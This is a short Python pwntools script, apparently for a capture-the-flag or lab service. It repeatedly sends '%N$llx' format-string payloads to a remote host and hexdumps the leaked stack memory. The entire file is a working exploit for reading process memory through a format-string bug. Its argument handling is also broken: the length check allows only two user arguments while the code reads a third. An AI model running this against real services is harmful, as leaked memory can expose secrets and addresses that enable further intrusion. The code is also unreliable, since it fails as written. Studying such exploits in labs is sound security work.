from pwn import *
import re, sys, hexdump, time

# Parameters:
# r: (remote) process
# u: read until string that preceeds the format string output
# n: number of 16 words to print
def get64(r, u, n):
    data = ''
    for i in range(1, n+1):
        r.sendline('0')
        r.sendline(r'%{}$llx'.format(i))
        r.recvuntil(u)
        x = r.recvline().zfill(17).replace('\n','')
        data += "".join([x[i:i+2] for i in range(0, len(x), 2)][::-1])
    return data


context.log_level='error'
if len(sys.argv) != 3:
    print 'Usage: ./prog <number of repetitions> <number of words to print> <time to sleep between repetitions in seconds>'
    sys.exit(2)

H,P='localhost',6666
#H,P='pwnbox',1337
for i in range(int(sys.argv[1])):
    r = remote(H,P)
    dump = get64(r, 'Hello ', int(sys.argv[2]))
    hexdump.hexdump(dump.decode('hex'))
    time.sleep(float(sys.argv[3]))
